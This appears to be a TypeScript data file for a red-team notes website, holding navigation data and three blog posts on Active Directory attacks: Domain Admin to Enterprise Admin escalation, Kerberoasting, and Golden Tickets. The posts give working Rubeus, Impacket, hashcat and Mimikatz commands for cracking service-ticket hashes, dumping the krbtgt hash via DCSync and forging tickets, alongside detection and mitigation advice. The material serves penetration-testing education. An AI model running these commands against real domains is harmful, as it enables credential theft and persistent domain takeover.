import type { NavItem, Article, BlogPost } from '@/types';

export const navigationItems: NavItem[] = [
  {
    id: 'intro',
    title: 'What is Red Team Notes?',
    href: '/',
    pinned: true,
  },
  {
    id: 'cheatsheets',
    title: 'Pentesting Cheatsheets',
    href: '/cheatsheets',
    pinned: true,
  },
  {
    id: 'ad-kerberos',
    title: 'Active Directory & Kerberos Abuse',
    items: [
      { id: 'da-to-ea', title: 'From Domain Admin to Enterprise Admin', href: '/blog/da-to-ea' },
      { id: 'kerberoasting', title: 'Kerberoasting', href: '/blog/kerberoasting' },
      { id: 'golden-tickets', title: 'Kerberos: Golden Tickets', href: '/blog/golden-tickets' },
      { id: 'silver-tickets', title: 'Kerberos: Silver Tickets', href: '/blog/silver-tickets' },
      { id: 'asrep-roasting', title: 'AS-REP Roasting', href: '/blog/asrep-roasting' },
      { id: 'unconstrained-delegation', title: 'Kerberos Unconstrained Delegation', href: '/blog/unconstrained-delegation' },
      { id: 'constrained-delegation', title: 'Kerberos Constrained Delegation', href: '/blog/constrained-delegation' },
      { id: 'resource-based-delegation', title: 'Kerberos Resource-based Constrained Delegation', href: '/blog/resource-based-delegation' },
      { id: 'dcshadow', title: 'DCShadow - Becoming a Rogue Domain Controller', href: '/blog/dcshadow' },
      { id: 'dcsync', title: 'DCSync: Dump Password Hashes from Domain Controller', href: '/blog/dcsync' },
      { id: 'powerview', title: 'PowerView: Active Directory Enumeration', href: '/blog/powerview' },
      { id: 'acls-aces', title: 'Abusing Active Directory ACLs/ACEs', href: '/blog/acls-aces' },
      { id: 'token-privileges', title: 'Privileged Accounts and Token Privileges', href: '/blog/token-privileges' },
    ],
  },
  {
    id: 'sql-injection',
    title: 'SQL Injection & XSS Playground',
    href: '/sql-injection',
  },
];

export const articles: Article[] = [
  {
    id: 'da-to-ea',
    title: 'From Domain Admin to Enterprise Admin',
    description: 'Escalating privileges from Domain Admin to Enterprise Admin in multi-domain forests.',
    href: '/blog/da-to-ea',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'kerberoasting',
    title: 'Kerberoasting',
    description: 'Extracting service account credentials through Kerberos TGS requests.',
    href: '/blog/kerberoasting',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'golden-tickets',
    title: 'Kerberos: Golden Tickets',
    description: 'Creating forged TGTs for persistent domain access.',
    href: '/blog/golden-tickets',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'silver-tickets',
    title: 'Kerberos: Silver Tickets',
    description: 'Forging service tickets for specific service access.',
    href: '/blog/silver-tickets',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'asrep-roasting',
    title: 'AS-REP Roasting',
    description: 'Cracking passwords for accounts with Kerberos pre-authentication disabled.',
    href: '/blog/asrep-roasting',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'rc4-aes',
    title: 'Kerberoasting: Requesting RC4 Encrypted TGS when AES is Enabled',
    description: 'Forcing weak encryption for easier credential cracking.',
    href: '/blog/rc4-aes',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'unconstrained-delegation',
    title: 'Kerberos Unconstrained Delegation',
    description: 'Exploiting unconstrained delegation for domain compromise.',
    href: '/blog/unconstrained-delegation',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'constrained-delegation',
    title: 'Kerberos Constrained Delegation',
    description: 'Abusing constrained delegation for privilege escalation.',
    href: '/blog/constrained-delegation',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'resource-based-delegation',
    title: 'Kerberos Resource-based Constrained Delegation: Computer Object Takeover',
    description: 'Taking over computer objects through resource-based constrained delegation.',
    href: '/blog/resource-based-delegation',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'dc-print-server',
    title: 'Domain Compromise via DC Print Server and Kerberos Delegation',
    description: 'Exploiting print server configurations for domain compromise.',
    href: '/blog/dc-print-server',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'dcshadow',
    title: 'DCShadow - Becoming a Rogue Domain Controller',
    description: 'Creating a rogue domain controller for persistent access.',
    href: '/blog/dcshadow',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'dcsync',
    title: 'DCSync: Dump Password Hashes from Domain Controller',
    description: 'Extracting password hashes using DRS replication.',
    href: '/blog/dcsync',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'powerview',
    title: 'PowerView: Active Directory Enumeration',
    description: 'Comprehensive AD enumeration with PowerView.',
    href: '/blog/powerview',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'acls-aces',
    title: 'Abusing Active Directory ACLs/ACEs',
    description: 'Exploiting misconfigured access control lists.',
    href: '/blog/acls-aces',
    category: 'Active Directory & Kerberos Abuse',
  },
  {
    id: 'token-privileges',
    title: 'Privileged Accounts and Token Privileges',
    description: 'Understanding and exploiting Windows token privileges.',
    href: '/blog/token-privileges',
    category: 'Active Directory & Kerberos Abuse',
  },
];

export const blogPosts: Record<string, BlogPost> = {
  'da-to-ea': {
    id: 'da-to-ea',
    title: 'From Domain Admin to Enterprise Admin',
    date: '2024-01-15',
    category: 'Active Directory & Kerberos Abuse',
    content: `
## Overview

In Active Directory environments with multiple domains, the Enterprise Admins group holds the highest level of privilege across the entire forest. This article explores techniques to escalate from Domain Admin to Enterprise Admin.

## Understanding the Trust Architecture

When dealing with multi-domain forests, it's crucial to understand the trust relationships between domains. The Enterprise Admins group exists only in the root domain of a forest but has administrative privileges across all domains.

## Exploitation Technique

### Step 1: Identify the Forest Structure

First, we need to understand the domain hierarchy:

\`\`\`powershell
Get-ADForest | Select-Object Name, Domains, RootDomain
Get-ADDomain | Select-Object Name, ParentDomain, ChildDomains
\`\`\`

### Step 2: Locate Enterprise Admin Accounts

Identify accounts with Enterprise Admin privileges:

\`\`\`powershell
Get-ADGroupMember "Enterprise Admins" -Server root.domain.com
\`\`\`

### Step 3: Cross-Domain Authentication

Leverage existing trust relationships to move laterally:

\`\`\`powershell
# Request inter-realm TGT
Rubeus.exe asktgs /service:krbtgt/child.domain.com /user:admin@parent.domain.com /rc4:HASH
\`\`\`

## Mitigation Strategies

- Implement strict access controls on Enterprise Admin accounts
- Use Privileged Access Workstations (PAWs)
- Enable SID filtering on external trusts
- Regular audit of privileged group memberships

## Conclusion

Escalating from Domain Admin to Enterprise Admin requires understanding of forest-wide trust relationships. Proper segmentation and monitoring can help prevent these attacks.
    `,
  },
  'kerberoasting': {
    id: 'kerberoasting',
    title: 'Kerberoasting',
    date: '2024-01-20',
    category: 'Active Directory & Kerberos Abuse',
    content: `
## What is Kerberoasting?

Kerberoasting is an attack technique that targets service accounts in Active Directory by exploiting how Kerberos handles service tickets. Any authenticated domain user can request service tickets (TGS) for services with registered SPNs.

## How Kerberoasting Works

1. Attacker identifies service accounts with SPNs
2. Requests TGS tickets for those services
3. Extracts tickets from memory
4. Cracks tickets offline to obtain plaintext passwords

## Identifying Target Accounts

### Using PowerView

\`\`\`powershell
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
\`\`\`

### Using ActiveDirectory Module

\`\`\`powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
\`\`\`

## Performing the Attack

### With Rubeus

\`\`\`powershell
# Request all TGS tickets
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Request specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/sqlserver.domain.com:1433 /format:hashcat
\`\`\`

### With Impacket

\`\`\`bash
GetUserSPNs.py domain.com/user -request -format hashcat -outputfile hashes.txt
\`\`\`

## Cracking the Hashes

Once you have the TGS tickets, crack them with Hashcat:

\`\`\`bash
# Mode 13100 for Kerberos 5 TGS-REP
hashcat -m 13100 hashes.txt wordlist.txt -o cracked.txt
\`\`\`

## Detection and Mitigation

- Monitor for unusual TGS requests
- Use strong passwords for service accounts (25+ characters)
- Implement Managed Service Accounts (gMSA)
- Enable AES encryption and disable RC4
- Regular password rotation for service accounts

## References

- ATT&CK Technique: T1208 - Kerberoasting
- https://attack.mitre.org/techniques/T1208/
    `,
  },
  'golden-tickets': {
    id: 'golden-tickets',
    title: 'Kerberos: Golden Tickets',
    date: '2024-02-01',
    category: 'Active Directory & Kerberos Abuse',
    content: `
## What are Golden Tickets?

Golden Tickets are forged Kerberos Ticket Granting Tickets (TGTs) that provide persistent access to an entire Active Directory domain. With the KRBTGT account hash, attackers can create tickets that grant any access level.

## Prerequisites

- Domain KRBTGT account NTLM hash
- Domain SID
- Domain name

## Extracting KRBTGT Hash

### Using DCSync

\`\`\`powershell
# With Mimikatz
lsadump::dcsync /domain:domain.com /user:krbtgt

# With secretsdump.py
secretsdump.py domain.com/administrator@dc.domain.com -just-dc-user krbtgt
\`\`\`

## Creating Golden Tickets

### With Mimikatz

\`\`\`powershell
# Create golden ticket
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /id:500 /groups:512 /ptt

# Export to file
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi
\`\`\`

### With Rubeus

\`\`\`powershell
Rubeus.exe golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /id:500 /groups:512 /ptt
\`\`\`

## Using the Golden Ticket

Once injected, the ticket can be used with any tool:

\`\`\`powershell
# List DC files
dir \\dc.domain.com\c$

# Open remote session
Enter-PSSession dc.domain.com
\`\`\`

## Persistence Considerations

Golden tickets remain valid until:
- The KRBTGT password is changed twice
- The ticket expiration time is reached (default 10 years)

## Detection

- Monitor for unusual TGT requests
- Alert on KRBTGT account usage
- Track privileged account activities
- Implement honeytokens

## Mitigation

- Change KRBTGT password regularly (twice to invalidate existing tickets)
- Monitor for Golden Ticket indicators
- Implement Privileged Access Management (PAM)
- Use Advanced Threat Analytics (ATA)

## References

- https://attack.mitre.org/techniques/T1098/001/
- https://adsecurity.org/?p=1515
    `,
  },
};
